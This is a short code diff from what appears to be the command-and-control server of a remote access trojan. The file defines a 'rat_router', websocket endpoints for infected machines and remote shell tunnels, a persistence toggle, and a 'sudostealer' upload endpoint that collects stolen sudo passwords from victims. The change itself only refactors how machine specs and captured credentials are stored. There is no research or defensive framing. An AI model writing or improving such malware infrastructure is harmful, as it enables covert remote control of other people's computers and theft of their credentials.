@@ -39,7 +39,7 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 						machines.all[machine_id].persistence.enabled = False
 					await con.broadcast_machine_update(machines.all[machine_id])
 				case "specs":
-					machines.all[machine_id].update_specs(data["data"])
+					machines.all[machine_id].specs.update(data["data"])
 					await con.broadcast_machine_update(machines.all[machine_id])
 
 	except WebSocketDisconnect:
@@ -68,4 +68,4 @@ async def shell_websocket_endpoint(websocket: WebSocket, version: int, tunnel_id
 @rat_router.post("/{version}/{machine_id}/sudostealer/upload")
 async def upload_credentials(version: int, machine_id: Uid, request: Request) -> None:
 	text = (await request.body()).decode()
-	machines.all[machine_id].sudostealer.credentials.append(text)
+	machines.all[machine_id].sudostealer.add(text)
